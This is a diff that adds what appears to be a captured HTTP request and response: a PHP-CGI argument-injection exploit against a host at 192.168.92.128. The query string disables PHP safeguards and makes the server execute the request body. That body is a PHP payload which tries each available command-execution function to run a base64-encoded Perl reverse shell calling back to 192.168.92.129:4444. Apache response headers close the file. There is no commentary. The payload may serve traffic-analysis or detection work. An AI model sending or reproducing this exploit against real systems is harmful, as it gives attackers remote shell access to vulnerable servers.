@@ -1,0 +1,15 @@
+POST /?--define+allow_url_include%3doN+--define+safe_mode%3doff+--define+suhosin.simulation%3d1+-d+disable_functions%3d%22%22+-%64+open_basedir%3dnone+--define+auto_prepend_file%3dphp://input+-%64+cgi.force_redirect%3dFaLSe+-d+cgi.redirect_status_env%3d0+--no-php-ini HTTP/1.1
+Host: 192.168.92.128
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 2159
+
+<?php /*<?php /**/      @error_reporting(0);      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);      $ZjiA=@ini_get('disable_functions');      if(!empty($ZjiA)){        $ZjiA=preg_replace('/[, ]+/', ',', $ZjiA);        $ZjiA=explode(',', $ZjiA);        $ZjiA=array_map('trim', $ZjiA);      }else{        $ZjiA=array();      }      $c = base64_decode('cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxOTIuMTY4LjkyLjEyOTo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3N5c3RlbSRfIHdoaWxlPD47Jw==');      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {        $c=$c." 2>&1\n";      }      $uGcQJl='is_callable';      $SYnUGG='in_array';            if($uGcQJl('popen')and!$SYnUGG('popen',$ZjiA)){        $fp=popen($c,'r');        $cVHQzA=NULL;        if(is_resource($fp)){          while(!feof($fp)){            $cVHQzA.=fread($fp,1024);          }        }        @pclose($fp);      }else      if($uGcQJl('shell_exec')and!$SYnUGG('shell_exec',$ZjiA)){        $cVHQzA=shell_exec($c);      }else      if($uGcQJl('proc_open')and!$SYnUGG('proc_open',$ZjiA)){        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);        $cVHQzA=NULL;        while(!feof($pipes[1])){          $cVHQzA.=fread($pipes[1],1024);        }        @proc_close($handle);      }else      if($uGcQJl('exec')and!$SYnUGG('exec',$ZjiA)){        $cVHQzA=array();        exec($c,$cVHQzA);        $cVHQzA=join(chr(10),$cVHQzA).chr(10);      }else      if($uGcQJl('system')and!$SYnUGG('system',$ZjiA)){        ob_start();        system($c);        $cVHQzA=ob_get_contents();        ob_end_clean();      }else      if($uGcQJl('passthru')and!$SYnUGG('passthru',$ZjiA)){        ob_start();        passthru($c);        $cVHQzA=ob_get_contents();        ob_end_clean();      }else      {        $cVHQzA=0;      }    HTTP/1.1 200 OK
+Date: Fri, 26 Jul 2024 12:00:29 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Last-Modified: Mon, 29 Apr 2024 11:40:57 GMT
+ETag: "2aa6-6173aba0dba49"
+Accept-Ranges: bytes
+Content-Length: 10918
+Vary: Accept-Encoding
+Content-Type: text/html
